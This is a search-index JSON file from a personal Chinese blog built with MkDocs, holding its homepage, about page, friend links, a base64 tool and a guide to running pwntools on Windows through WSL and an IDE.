{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u9996\u9875 \u4e00\u4e9b\u5de5\u7a0b\u8bb0\u5f55\u548c\u77e5\u8bc6\u5e93\u3002 \u7f51\u7ad9\u57fa\u4e8e Material for MkDocs \u6784\u5efa\uff0c\u8bc4\u8bba\u529f\u80fd\u4f7f\u7528\u4e86 Gitalk \u3002\u4e3b\u8981\u5185\u5bb9\u662f\u5173\u4e8e\u4e00\u4e9b\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u7684\u8bb0\u5f55\uff0cCTF Writeup\uff0c\u8fd8\u6709\u5b66\u6821\u8bfe\u7a0b\u7684\u76f8\u5173\u5185\u5bb9\uff0c\u8fd8\u5728\u9010\u6b65\u66f4\u65b0\u3002 Color Palette \u8c03\u8272\u677f \u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u66f4\u6539\u7f51\u7ad9\u4e3b\u9898\u7684\u989c\u8272\u3002 Primary Colors \u4e3b\u8272 \u9ed8\u8ba4\u662f White \u70b9\u6309\u8272\u5757\u4ee5\u66f4\u6539\u4e3b\u9898\u7684\u4e3b\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange Brown Grey Blue Grey White var buttons = document.querySelectorAll(\"button[data-md-color-primary]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorPrimary = this.dataset.mdColorPrimary; localStorage.setItem(\"data-md-color-primary\", document.body.dataset.mdColorPrimary); }) }) Accent Colors \u8f85\u52a9\u8272 \u9ed8\u8ba4\u662f Lime \u70b9\u6309\u8272\u5757\u4ee5\u66f4\u6539\u4e3b\u9898\u7684\u8f85\u52a9\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange var buttons = document.querySelectorAll(\"button[data-md-color-accent]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorAccent = this.dataset.mdColorAccent; localStorage.setItem(\"data-md-color-accent\", document.body.dataset.mdColorAccent); }) })","title":"\u9996\u9875\u548c\u8c03\u8272\u677f"},{"location":"#_1","text":"\u4e00\u4e9b\u5de5\u7a0b\u8bb0\u5f55\u548c\u77e5\u8bc6\u5e93\u3002 \u7f51\u7ad9\u57fa\u4e8e Material for MkDocs \u6784\u5efa\uff0c\u8bc4\u8bba\u529f\u80fd\u4f7f\u7528\u4e86 Gitalk \u3002\u4e3b\u8981\u5185\u5bb9\u662f\u5173\u4e8e\u4e00\u4e9b\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u7684\u8bb0\u5f55\uff0cCTF Writeup\uff0c\u8fd8\u6709\u5b66\u6821\u8bfe\u7a0b\u7684\u76f8\u5173\u5185\u5bb9\uff0c\u8fd8\u5728\u9010\u6b65\u66f4\u65b0\u3002","title":"\u9996\u9875"},{"location":"#color-palette","text":"\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u66f4\u6539\u7f51\u7ad9\u4e3b\u9898\u7684\u989c\u8272\u3002","title":"Color Palette \u8c03\u8272\u677f"},{"location":"#primary-colors","text":"\u9ed8\u8ba4\u662f White \u70b9\u6309\u8272\u5757\u4ee5\u66f4\u6539\u4e3b\u9898\u7684\u4e3b\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange Brown Grey Blue Grey White var buttons = document.querySelectorAll(\"button[data-md-color-primary]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorPrimary = this.dataset.mdColorPrimary; localStorage.setItem(\"data-md-color-primary\", document.body.dataset.mdColorPrimary); }) })","title":"Primary Colors \u4e3b\u8272"},{"location":"#accent-colors","text":"\u9ed8\u8ba4\u662f Lime \u70b9\u6309\u8272\u5757\u4ee5\u66f4\u6539\u4e3b\u9898\u7684\u8f85\u52a9\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange var buttons = document.querySelectorAll(\"button[data-md-color-accent]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorAccent = this.dataset.mdColorAccent; localStorage.setItem(\"data-md-color-accent\", document.body.dataset.mdColorAccent); }) })","title":"Accent Colors \u8f85\u52a9\u8272"},{"location":"about/","text":"\u5173\u4e8e \u4f24\u75d5\u7d2f\u7d2f\uff0c\u75db\u82e6\u7126\u8651\u5374\u4e0d\u7518\u5e73\u5eb8\u3002 \u5927\u4e00\u90a3\u4f1a\u513f\u6c89\u8ff7\u4e8e\u4eac\u4e1c\u4e0a\u4e70\u4e66\uff08\u597d\u50cf\u6709\u54ea\u91cc\u4e0d\u5bf9\uff1f\uff09\uff0c\u4e00\u5e74\u4e0b\u6765\u4e70\u4e86\u4e0d\u77e5\u9053\u591a\u5c11\u4e66\uff0c\u6bcf\u6708\u52cb\u7ae0\u5238\u90fd\u8981\u7528\u4e0a\u4e0d\u8bf4\uff0c\u5e73\u65f6\u6d3b\u52a8\u4e5f\u4f1a\u64b8\u4e00\u5927\u5806\u56e4\u7740\uff0c\u8fd9\u6837\u7684\u540e\u679c\u5c31\u662f\u642c\u5bbf\u820d\u7684\u65f6\u5019\u6211\u4e0d\u5f97\u4e0d\u53eb\u4e00\u8f86\u9762\u5305\u8f66\u6765\u8fd0\uff08\u771f\u7684\u4e00\u8f66\u4e66\uff09\u3002 \u7ecf\u5e38\u6709\u4eba\u8981\u95ee\u6211\u4e70\u4e86\u90a3\u4e48\u591a\u770b\u4e86\u591a\u5c11\uff0c\u8fd9\u4e2a...\u5927\u4e00\u786e\u5b9e\u5c3d\u529b\u770b\u4e86\u4e0d\u5c11\uff0c\u4f46\u662f\u6211\u8fd9\u4eba\u6709\u4e2a\u574f\u4e60\u60ef\u5c31\u662f\u770b\u4e66\u4e0d\u559c\u6b22\u505a\u7b14\u8bb0\uff0c\u4e00\u672c\u4e66\u770b\u5b8c\u4e0b\u6765\uff0c\u9664\u4e86\u6709\u7ffb\u8fc7\u7684\u75d5\u8ff9\u4e4b\u5916\u4f3c\u4e4e\u5c31\u6ca1\u522b\u7684\u4e86\u3002\u66fe\u7ecf\u4ee5\u4e3a\u81ea\u5df1\u8bb0\u6587\u79d1\u7684\u4e1c\u897f\u4e0d\u884c\uff0c\u8bb0\u8fd9\u4e9b\u4e1c\u897f\u8fd8\u662f\u6ca1\u4ec0\u4e48\u538b\u529b\u7684\u3002\u4f46\u662f\u5230\u5927\u4e8c\uff0c\u5fd9\u7740\u4e0a\u8bfe\u7136\u540e\u633a\u4e45\u6ca1\u6709\u82b1\u65f6\u95f4\u8bfb\u90a3\u4e9b\u4e66\uff0c\u73b0\u5728\u56de\u8fc7\u5934\u6765\u624d\u53d1\u73b0\u5fd8\u8bb0\u4e86\u4e0d\u5c11\uff0c\u90a3\u4e9b\u5f88\u6709\u610f\u4e49\u7684\u5185\u5bb9\u8bb0\u5f97\u4e0d\u662f\u975e\u5e38\u6e05\u695a\uff0c\u6709\u4e9b\u8981\u7528\u7684\u65f6\u5019\u5374\u627e\u4e0d\u5230\u5728\u54ea\u3002\u8fd9\u4e2a\u65f6\u5019\u624d\u89c9\u5f97\u5e73\u65f6\u6709\u8bb0\u5f55\u8fd9\u4e9b\u591a\u4e48\u91cd\u8981\uff0c\u4e0d\u53ea\u662f\u4e66\u4e0a\u4e00\u4e9b\u91cd\u8981\u7684\u4e1c\u897f\uff0c\u8fd8\u6709\u5e73\u65f6\u8e29\u7684\u5751\u3002 \u60f3\u5230\u4e4b\u524d\u90a3\u4e9b\u9057\u61be\uff0c\u73b0\u5728\u51b3\u5b9a\u8fd8\u662f\u597d\u597d\u5199\u70b9\u5de5\u7a0b\u65e5\u8bb0\u4ec0\u4e48\u7684\uff0c\u4e5f\u65b9\u4fbf\u81ea\u5df1\u67e5\u9605\u3002\u5982\u679c\u8fd9\u80fd\u5e2e\u5230\u4f60\uff0c\u6211\u8868\u793a\u975e\u5e38\u9ad8\u5174\uff1b\u5982\u679c\u4f60\u53d1\u73b0\u95ee\u9898\uff0c\u8fd8\u8bf7\u60a8\u544a\u8bc9\u6211\uff1a im@chikorita.fun \u3002","title":"\u76f8\u5173\u4fe1\u606f"},{"location":"about/#_1","text":"\u4f24\u75d5\u7d2f\u7d2f\uff0c\u75db\u82e6\u7126\u8651\u5374\u4e0d\u7518\u5e73\u5eb8\u3002 \u5927\u4e00\u90a3\u4f1a\u513f\u6c89\u8ff7\u4e8e\u4eac\u4e1c\u4e0a\u4e70\u4e66\uff08\u597d\u50cf\u6709\u54ea\u91cc\u4e0d\u5bf9\uff1f\uff09\uff0c\u4e00\u5e74\u4e0b\u6765\u4e70\u4e86\u4e0d\u77e5\u9053\u591a\u5c11\u4e66\uff0c\u6bcf\u6708\u52cb\u7ae0\u5238\u90fd\u8981\u7528\u4e0a\u4e0d\u8bf4\uff0c\u5e73\u65f6\u6d3b\u52a8\u4e5f\u4f1a\u64b8\u4e00\u5927\u5806\u56e4\u7740\uff0c\u8fd9\u6837\u7684\u540e\u679c\u5c31\u662f\u642c\u5bbf\u820d\u7684\u65f6\u5019\u6211\u4e0d\u5f97\u4e0d\u53eb\u4e00\u8f86\u9762\u5305\u8f66\u6765\u8fd0\uff08\u771f\u7684\u4e00\u8f66\u4e66\uff09\u3002 \u7ecf\u5e38\u6709\u4eba\u8981\u95ee\u6211\u4e70\u4e86\u90a3\u4e48\u591a\u770b\u4e86\u591a\u5c11\uff0c\u8fd9\u4e2a...\u5927\u4e00\u786e\u5b9e\u5c3d\u529b\u770b\u4e86\u4e0d\u5c11\uff0c\u4f46\u662f\u6211\u8fd9\u4eba\u6709\u4e2a\u574f\u4e60\u60ef\u5c31\u662f\u770b\u4e66\u4e0d\u559c\u6b22\u505a\u7b14\u8bb0\uff0c\u4e00\u672c\u4e66\u770b\u5b8c\u4e0b\u6765\uff0c\u9664\u4e86\u6709\u7ffb\u8fc7\u7684\u75d5\u8ff9\u4e4b\u5916\u4f3c\u4e4e\u5c31\u6ca1\u522b\u7684\u4e86\u3002\u66fe\u7ecf\u4ee5\u4e3a\u81ea\u5df1\u8bb0\u6587\u79d1\u7684\u4e1c\u897f\u4e0d\u884c\uff0c\u8bb0\u8fd9\u4e9b\u4e1c\u897f\u8fd8\u662f\u6ca1\u4ec0\u4e48\u538b\u529b\u7684\u3002\u4f46\u662f\u5230\u5927\u4e8c\uff0c\u5fd9\u7740\u4e0a\u8bfe\u7136\u540e\u633a\u4e45\u6ca1\u6709\u82b1\u65f6\u95f4\u8bfb\u90a3\u4e9b\u4e66\uff0c\u73b0\u5728\u56de\u8fc7\u5934\u6765\u624d\u53d1\u73b0\u5fd8\u8bb0\u4e86\u4e0d\u5c11\uff0c\u90a3\u4e9b\u5f88\u6709\u610f\u4e49\u7684\u5185\u5bb9\u8bb0\u5f97\u4e0d\u662f\u975e\u5e38\u6e05\u695a\uff0c\u6709\u4e9b\u8981\u7528\u7684\u65f6\u5019\u5374\u627e\u4e0d\u5230\u5728\u54ea\u3002\u8fd9\u4e2a\u65f6\u5019\u624d\u89c9\u5f97\u5e73\u65f6\u6709\u8bb0\u5f55\u8fd9\u4e9b\u591a\u4e48\u91cd\u8981\uff0c\u4e0d\u53ea\u662f\u4e66\u4e0a\u4e00\u4e9b\u91cd\u8981\u7684\u4e1c\u897f\uff0c\u8fd8\u6709\u5e73\u65f6\u8e29\u7684\u5751\u3002 \u60f3\u5230\u4e4b\u524d\u90a3\u4e9b\u9057\u61be\uff0c\u73b0\u5728\u51b3\u5b9a\u8fd8\u662f\u597d\u597d\u5199\u70b9\u5de5\u7a0b\u65e5\u8bb0\u4ec0\u4e48\u7684\uff0c\u4e5f\u65b9\u4fbf\u81ea\u5df1\u67e5\u9605\u3002\u5982\u679c\u8fd9\u80fd\u5e2e\u5230\u4f60\uff0c\u6211\u8868\u793a\u975e\u5e38\u9ad8\u5174\uff1b\u5982\u679c\u4f60\u53d1\u73b0\u95ee\u9898\uff0c\u8fd8\u8bf7\u60a8\u544a\u8bc9\u6211\uff1a im@chikorita.fun \u3002","title":"\u5173\u4e8e"},{"location":"how_to_build_a_site_like_this/","text":"","title":"How to build a site like this"},{"location":"links/","text":"\u53cb\u60c5\u94fe\u63a5 \u4e0d\u5206\u5148\u540e Alikas https://alikas.cf/ Apeng https://apeng.fun/ obliviate https://cp32.github.io/ \u5c0f\u767d https://wulidecade.cn/ \u5c0f\u6db5\u7684\u7b14\u8bb0 https://gardevoir.yoga/ \u5176\u5b83 \u5229\u7528 OnlineJudge 2.0 \u642d\u5efa\u7684OJ\uff0c\u6682\u65f6\u4f1a\u955c\u50cf\u4e00\u4e9b\u6df1\u5927\u7684\u7ec3\u4e60\u9898\u7ed9\u5927\u5bb6\u73a9\uff0c\u5982\u679c\u4f60\u6709\u9898\u76ee\u60f3\u5171\u4eab\uff0c\u53ef\u4ee5\u8054\u7cfb\u6211\u3002 \u70b9\u6b64\u8df3\u8f6c\u81f3OJ \u3002","title":"\u76f8\u5173\u94fe\u63a5"},{"location":"links/#_1","text":"\u4e0d\u5206\u5148\u540e Alikas https://alikas.cf/ Apeng https://apeng.fun/ obliviate https://cp32.github.io/ \u5c0f\u767d https://wulidecade.cn/ \u5c0f\u6db5\u7684\u7b14\u8bb0 https://gardevoir.yoga/","title":"\u53cb\u60c5\u94fe\u63a5"},{"location":"links/#_2","text":"\u5229\u7528 OnlineJudge 2.0 \u642d\u5efa\u7684OJ\uff0c\u6682\u65f6\u4f1a\u955c\u50cf\u4e00\u4e9b\u6df1\u5927\u7684\u7ec3\u4e60\u9898\u7ed9\u5927\u5bb6\u73a9\uff0c\u5982\u679c\u4f60\u6709\u9898\u76ee\u60f3\u5171\u4eab\uff0c\u53ef\u4ee5\u8054\u7cfb\u6211\u3002 \u70b9\u6b64\u8df3\u8f6c\u81f3OJ \u3002","title":"\u5176\u5b83"},{"location":"ctf_tools/base64/","text":"\u770b\u6765\u8fd9\u53c8\u662f\u6211\u5f00\u7684\u4e00\u4e2a\u5927\u5751\uff0c\u4e5f\u4e0d\u77e5\u9053\u4ec0\u4e48\u65f6\u5019\u80fd\u586b\u4e0a... \u7528atob();\u548cbtoa();\u5b9e\u73b0\u7684\u5c0f\u73a9\u610f\u513f\uff0c\u6709\u7a7a\u518d\u6765\u641e\u8fd9\u91cc\u7684\u6837\u5f0f\u3002 \u8fd9\u91cc\u8f93\u5165\u5f85\u52a0\u5bc6\u7684\u6587\u5b57 ENCODE \u52a0\u5bc6 DECODE \u89e3\u5bc6 \u8fd9\u91cc\u8f93\u5165\u5f85\u89e3\u5bc6\u7684\u6587\u5b57 function pressToEncode() { document.getElementById('ciphertext').value = window.btoa(document.getElementById('plaintext').value); } function pressToDecode() { document.getElementById('plaintext').value = window.atob(document.getElementById('ciphertext').value); }","title":"\u5728\u7ebfBASE64\u52a0\u89e3\u5bc6\uff08\u5b9e\u9a8c\u6027\uff09"},{"location":"ctf_tools/binwalk/","text":"","title":"Binwalk"},{"location":"ctf_tools/fcrackzip/","text":"","title":"Fcrackzip"},{"location":"ctf_tools/foremost/","text":"","title":"Foremost"},{"location":"ctf_tools/pwntools/","text":"\uff08\u4ee5\u4e0b\u662f\u5c0f\u5b66\u751f\u65e5\u8bb0\u5f0f\u5f00\u5934\uff09 \u4eca\u5929\u6211\u4eec\u6765\u8ba8\u8bba\u4e00\u4e0b\u5728Windows\u4e0a\u4f7f\u7528pwntools\u7684\u65b0\u59ff\u52bf\u3002 \u597d\u5427\u5176\u5b9e\u4e5f\u4e0d\u7b97\u65b0\uff0cWSL\u5230\u73b0\u5728\u4e5f\u6709\u4e00\u6bb5\u65f6\u95f4\u4e86\uff0cPyCharm\u652f\u6301\u5b83\u4e5f\u633a\u4e45\u4e86\uff0c\u4e0b\u9762\u5c31\u6765\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b\u600e\u4e48\u73a9\u800d\u2014\u2014 \u5982\u679c\u4f60\u4e0d\u6253\u7b97\u7528IDE... \u90a3\u4f3c\u4e4e\u5e76\u4e0d\u9700\u8981\u770b\u6211\u4e0b\u9762\u5728\u5e9f\u8bdd\u4ec0\u4e48\u4e86...\u4f60\u53ea\u9700\u8981\uff1a 1\u3001\u5728 \u63a7\u5236\u9762\u677f->\u7a0b\u5e8f->\u542f\u7528\u6216\u5173\u95edWindows\u529f\u80fd \u91cc\u9009\u4e0a \u9002\u7528\u4e8eLinux\u7684Windows\u5b50\u7cfb\u7edf \uff0c\u6216\u662f\u76f4\u63a5\uff1a 1 Enable - WindowsOptionalFeature - Online - FeatureName Microsoft - Windows - Subsystem - Linux 2\u3001\u53ef\u4ee5\u5230 Microsoft Store \u641c\u7d22WSL\uff0c\u7136\u540e\u4e0b\u8f7d\u5b89\u88c5\u4e00\u4e2a\u9002\u5408\u4f60\u7684Linux\u53d1\u884c\u7248\u3002 3\u3001\u5728WSL\u4e2d\u5b89\u88c5\u4f60\u6240\u9700\u8981\u7684\u5de5\u5177\uff0c\u4f8b\u5982python\u3001nano\uff0c\u5f53\u7136\u8fd8\u6709pwntools\u3002 \u7136\u540e\u4f60\u5c31\u53ef\u4ee5\u6109\u5feb\u5730\u5f00\u59cb\u64b8\u9898\u4e86\u3002 \u51c6\u5907\u597dWSL\u548cIDE \u597d\u4e86\u6211\u4eec\u6765\u8fdb\u5165\u6b63\u9898\u3002\u8fd9\u91cc\u6211\u5c31\u5047\u8bbe\u4f60\u5df2\u7ecf\u6839\u636e\u4e0a\u9762\u7684\u51e0\u53e5\u7b80\u77ed\u7684\u63cf\u8ff0\u5b89\u88c5\u597d\u4e86WSL\uff08\u6ed1\u7a3d.jpg\uff09\u3002\u73b0\u5728\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9 JetBrains PyCharm \uff0c\u5bf9\u4e8e\u5b66\u751f\u6765\u8bf4\uff0c\u53ef\u4ee5\u7533\u8bf7\u6559\u80b2\u6388\u6743\u6765\u514d\u8d39\u4f7f\u7528Professional\u7248\u672c\u3002 \u53e6\u5916\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u62e5\u6709\u4e86JetBrains IntelliJ IDEA Ultimate\uff0c\u5e76\u4e14\u4e0d\u5e0c\u671b\u518d\u5b89\u88c5\u4e00\u4e2aIDE\uff0c\u4f60\u53ef\u4ee5\u5b89\u88c5Python\u63d2\u4ef6\u6765\u5b9e\u73b0\u3002 \u914d\u7f6e\u4e00\u4e0b \u5bf9\u4e8eIDEA \u5982\u679c\u4f60\u4e0d\u60f3\u770b\u6211\u626f\u76ae\uff0c\u4f60\u53ef\u4ee5\u51fa\u95e8\u62d0\u5f2f\u5230 \u8fd9\u91cc \uff0c\u4f46\u662f\u8981\u662f\u9047\u5230\u4e86\u95ee\u9898\uff0c\u4f60\u53ef\u80fd\u9700\u8981\u56de\u6765\u4e00\u8d9f\uff0c\u8bf4\u4e0d\u5b9a\u6709\u4f60\u9700\u8981\u7684\u7b54\u6848\u3002 \u597d\u4e86\uff0c\u6211\u5047\u88c5\u4f60\u5df2\u7ecf\u65b0\u5efa\u597d\u4e86\u4e00\u4e2aProject\uff0c\u8fd9\u4e2a\u65f6\u5019\u4f60\u53ef\u4ee5\u5728\u53f3\u4e0a\u89d2\u6216 Settings \u4e2d\u627e\u5230 Project Structure (Ctrl+Alt+Shift+S) \uff0c\u7136\u540e\u9009\u4e2d\u5de6\u4fa7\u680f\u7684 Platform Settings->SDKs \uff0c\u70b9\u51fb\u52a0\u53f7\u5e76\u9009\u4e2d Python SDK \uff0c\u5c31\u50cf\u8fd9\u6837\uff1a \u6bd4\u8f83\u96be\u53d7\u7684\u662f\uff0c\u57282018.3\u8fd8\u662f\u6709 WSL \u9009\u9879\u7684\uff0c\u5347\u7ea7\u52302019.1\uff08\u63d2\u4ef6\u4e5f\u66f4\u65b0\u4e86\uff09\u5374\u6ca1\u6709\u4e86\uff0c\u8fd8\u6ca1\u6709\u53bb\u67e5\u5177\u4f53\u539f\u56e0\uff0c\u5e0c\u671b\u8fd9\u662f\u6682\u65f6\u7684\u3002\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u5148\u4f7f\u7528 SSH Interpreter \u4e00\u4e0b\u3002 \u8fd9\u4e2a\u65f6\u5019\u4f60\u5e94\u8be5\u4fdd\u8bc1WSL\u4e0a\u5df2\u7ecf\u5f00\u542f\u4e86SSH\u670d\u52a1\uff1a \u5982\u679c\u6ca1\u6709\uff0c\u4f60\u5e94\u5f53\u68c0\u67e5\uff1a\u662f\u5426\u5df2\u7ecf\u5b89\u88c5\u4e86\u4f8b\u5982openssh-server\u3001\u662f\u5426\u6ca1\u6709\u542f\u52a8\u670d\u52a1 1 sudo service ssh start \u3001\u6216\u662f\u914d\u7f6e\u6587\u4ef6\u5b58\u5728\u95ee\u9898 1 sudo nano / etc / ssh / sshd_config \uff1f\u6211\u89c9\u5f97\u4f60\u53ef\u4ee5\u901a\u8fc7\u641c\u7d22\u5f15\u64ce\u6765\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u3002 \u8fd9\u4e9b\u90fd\u51c6\u5907\u5c31\u7eea\u4e86\u4f60\u5c31\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u4fe1\u606f\u586b\u5165\u521a\u521a\u6253\u5f00\u7684\u7a97\u53e3\u4e2d\uff0c\u5c31\u50cf\u8fd9\u6837\uff1a \u4e0b\u4e00\u6b65\u4f60\u9700\u8981\u586b\u5165\u5bc6\u7801\u7b49\u4fe1\u606f\uff0c\u5728\u8fd9\u4e9b\u4e4b\u540e\u4f60\u5e94\u8be5\u5c31\u5b8c\u6210\u4e86\u5b83\u7684\u914d\u7f6e\u3002\u6211\u4eec\u6765\u770b\u770b\u8fd9\u91cc\uff1a \uff08\u5982\u679c\u4f60\u5df2\u7ecf\u5728WSL\u4e0a\u5b89\u88c5\u597d\u4e86pwntools\u5c31\u65e0\u89c6\u6389\u8fd9\u4e00\u884c\u3002\uff09\u70b9\u51fb\u53f3\u4fa7\u7684\u52a0\u53f7\uff0c\u4f60\u53ef\u4ee5\u641c\u7d22pwntools\u7136\u540e\u5b89\u88c5\u5b83\uff0c\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728WSL\u7684\u7ec8\u7aef\u91cc\u5b89\u88c5\u5b83\u3002 \u8fd9\u4e2a\u65f6\u5019\u4f60\u5e94\u8be5\u53ef\u4ee5\u56de\u5230\u7f16\u8f91\u5668\u5f00\u59cb\u5199\u7a0b\u5e8f\u4e86\uff0c\u4e0d\u8fc7\uff0c\u4f60\u53ef\u80fd\u4f3c\u4e4e\u53d1\u73b0\u6709\u54ea\u91cc\u4e0d\u5bf9...... \u5bf9\u4e8ePyCharm Professional \u55ef\uff0c\u5148\u629b\u4e0b\u521a\u521a\u4e0a\u9762\u53ef\u80fd\u7ffb\u8f66\u7684\u95ee\u9898\uff0c\u6211\u4eec\u6765\u770b\u770bPyCharm\u5982\u4f55\u6298\u817e\u3002 \u7531\u4e8e\u6211\u6ca1\u6709\u88c5PyCharm\uff0c\u6240\u4ee5...\u8bf7\u770b \u8fd9\u91cc \u3002 \u4e5f\u662f\u627e\u5230 Project Structure \u7136\u540e Add Python Interpreter \uff0c\u53ea\u662f\u8fd9\u6b21\u53ef\u4ee5\u76f4\u63a5\u9009\u62e9 WSL \uff0c\u4f3c\u4e4e\u53ef\u4ee5\u7701\u53bb\u5f88\u591a\u4e8b\u3002\u540c\u6837\uff0c\u5b89\u88c5\u597d\u5305\u4e4b\u540e\u5c31\u53ef\u4ee5\u56de\u5230\u7f16\u8f91\u5668\u5f00\u59cb\u5de5\u4f5c\u4e86\u3002 Unresolved reference 'pwn' \u4e0d\u77e5\u9053\u4f60\u662f\u5426\u4f1a\u9047\u5230\u8fd9\u4e2a\u95ee\u9898\u3002\u81f3\u5c11\uff0c\u6211\u88ab\u56f0\u6270\u4e86\u5f88\u4e45\u5e76\u4e14\u627e\u4e0d\u5230\u89e3\u51b3\u65b9\u6cd5\u4ee5\u81f3\u4e8e\u6709\u4e00\u6bb5\u65f6\u95f4\u90fd\u6ca1\u6709\u4f7f\u7528\u5b83\uff08\u597d\u5427\u5176\u5b9e\u6211\u65e9\u5c31\u8be5\u53bb\u8bba\u575b\u95ee\u95ee\u7684\uff09\u3002 \u8fd9\u4e2a\u95ee\u9898\u7684\u5177\u4f53\u8868\u73b0\u5e94\u8be5\u662f\uff0c\u4f8b\u5982 1 from pwn import * \u4f1a\u6709\u9519\u8bef\u4ea7\u751f\uff1a Unresolved reference 'pwn' \u8fd9\u4f1a\u5bfc\u81f4\u540e\u7eed\u548cpwntools\u76f8\u5173\u7684\u4ee3\u7801\u68c0\u67e5\u90fd\u51fa\u73b0\u95ee\u9898\u3002\u867d\u7136\u7a0b\u5e8f\u53ef\u4ee5\u6b63\u5e38\u5730 Run \u8d77\u6765\uff0c\u4f46\u662f\u8fd9\u5f88\u5f71\u54cd\u4f53\u9a8c\u3002\u4e0d\u8fc7\u4eca\u5929\u6211\u7a81\u7136\u53d1\u73b0\u4e86\u89e3\u51b3\u529e\u6cd5\uff0c\u5728\u8fd9\u91cc\uff1a Why PyCharm can't resolve reference for a remote Docker interpreter? Hi! Could you please invalidate caches with File | Invalidate Caches & Restart ? Has it helped? Pavel Karateev Created June 16, 2017 16:34 ...\u91cd\u542f\u540e\uff0c\u4e00\u5207\u5c31\u8fd9\u4e48\u6062\u590d\u4e86\u6b63\u5e38... ...\u4e0d\u77e5\u9053\u8be5\u8bf4\u4ec0\u4e48\u597d\u4e86... \u53e6\u5916 \u5bf9\u4e86\uff0c\u522b\u5fd8\u4e86 Add Python Interpreter \u91cc\u8fd8\u6709\u5f88\u591a\u9009\u9879\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5229\u7528\u5b83\u4eec\u6765\u5b9e\u73b0\u5728Windows\u4e0b\u73a9pwntools\uff0c\u800c\u4e14 SSH Interpreter \u4e5f\u4e0d\u4e00\u5b9a\u8981\u8fdeWSL\uff0c\u5404\u4f4d\u5c31\u81ea\u884c\u53d1\u6325\u597d\u5566\uff01","title":"Windows\u4e0b\u5229\u7528WSL\u4f7f\u7528pwntools"},{"location":"ctf_tools/pwntools/#ide","text":"\u90a3\u4f3c\u4e4e\u5e76\u4e0d\u9700\u8981\u770b\u6211\u4e0b\u9762\u5728\u5e9f\u8bdd\u4ec0\u4e48\u4e86...\u4f60\u53ea\u9700\u8981\uff1a 1\u3001\u5728 \u63a7\u5236\u9762\u677f->\u7a0b\u5e8f->\u542f\u7528\u6216\u5173\u95edWindows\u529f\u80fd \u91cc\u9009\u4e0a \u9002\u7528\u4e8eLinux\u7684Windows\u5b50\u7cfb\u7edf \uff0c\u6216\u662f\u76f4\u63a5\uff1a 1 Enable - WindowsOptionalFeature - Online - FeatureName Microsoft - Windows - Subsystem - Linux 2\u3001\u53ef\u4ee5\u5230 Microsoft Store \u641c\u7d22WSL\uff0c\u7136\u540e\u4e0b\u8f7d\u5b89\u88c5\u4e00\u4e2a\u9002\u5408\u4f60\u7684Linux\u53d1\u884c\u7248\u3002 3\u3001\u5728WSL\u4e2d\u5b89\u88c5\u4f60\u6240\u9700\u8981\u7684\u5de5\u5177\uff0c\u4f8b\u5982python\u3001nano\uff0c\u5f53\u7136\u8fd8\u6709pwntools\u3002 \u7136\u540e\u4f60\u5c31\u53ef\u4ee5\u6109\u5feb\u5730\u5f00\u59cb\u64b8\u9898\u4e86\u3002","title":"\u5982\u679c\u4f60\u4e0d\u6253\u7b97\u7528IDE..."},{"location":"ctf_tools/pwntools/#wslide","text":"\u597d\u4e86\u6211\u4eec\u6765\u8fdb\u5165\u6b63\u9898\u3002\u8fd9\u91cc\u6211\u5c31\u5047\u8bbe\u4f60\u5df2\u7ecf\u6839\u636e\u4e0a\u9762\u7684\u51e0\u53e5\u7b80\u77ed\u7684\u63cf\u8ff0\u5b89\u88c5\u597d\u4e86WSL\uff08\u6ed1\u7a3d.jpg\uff09\u3002\u73b0\u5728\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9 JetBrains PyCharm \uff0c\u5bf9\u4e8e\u5b66\u751f\u6765\u8bf4\uff0c\u53ef\u4ee5\u7533\u8bf7\u6559\u80b2\u6388\u6743\u6765\u514d\u8d39\u4f7f\u7528Professional\u7248\u672c\u3002 \u53e6\u5916\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u62e5\u6709\u4e86JetBrains IntelliJ IDEA Ultimate\uff0c\u5e76\u4e14\u4e0d\u5e0c\u671b\u518d\u5b89\u88c5\u4e00\u4e2aIDE\uff0c\u4f60\u53ef\u4ee5\u5b89\u88c5Python\u63d2\u4ef6\u6765\u5b9e\u73b0\u3002","title":"\u51c6\u5907\u597dWSL\u548cIDE"},{"location":"ctf_tools/pwntools/#_1","text":"","title":"\u914d\u7f6e\u4e00\u4e0b"},{"location":"ctf_tools/pwntools/#idea","text":"\u5982\u679c\u4f60\u4e0d\u60f3\u770b\u6211\u626f\u76ae\uff0c\u4f60\u53ef\u4ee5\u51fa\u95e8\u62d0\u5f2f\u5230 \u8fd9\u91cc \uff0c\u4f46\u662f\u8981\u662f\u9047\u5230\u4e86\u95ee\u9898\uff0c\u4f60\u53ef\u80fd\u9700\u8981\u56de\u6765\u4e00\u8d9f\uff0c\u8bf4\u4e0d\u5b9a\u6709\u4f60\u9700\u8981\u7684\u7b54\u6848\u3002 